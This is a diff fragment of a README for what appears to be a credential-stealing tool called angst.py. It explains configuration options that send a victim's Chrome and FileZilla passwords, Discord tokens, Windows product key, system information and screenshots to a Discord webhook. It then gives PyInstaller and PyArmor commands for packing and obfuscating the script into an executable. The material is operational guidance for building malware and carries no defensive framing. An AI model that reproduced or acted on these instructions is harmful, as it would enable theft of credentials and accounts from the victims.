@@ -31,12 +31,14 @@ CONFIG = {
 }
 
 ```
+
 webhook -> The discord webhook link which you want it to use. </br>
 chrome -> If it should include chrome passwords </br>
 filezilla -> Should it include possible saved filezilla passwords</br>
 windows -> Give information about your victim & includes the windows key</br>
 discord -> Steal discord tokens</br>
 screenshot -> takes a screenshot</br>
+</br>
 6. Run one of the following commands listed below, it is worth noting that pyarmor will sometimes corrupt the executable so if you plan on using the pyarmor command you should test it locally to make sure it works.</br>
 `PYINSTALLER: pyinstaller --onefile --hidden-import=pkg_resources.py2_warn angst.py`</br>
 `PYARMOR: pyarmor pack -e " --onefile --hidden-import=pkg_resources.py2_warn" angst.py`</br>
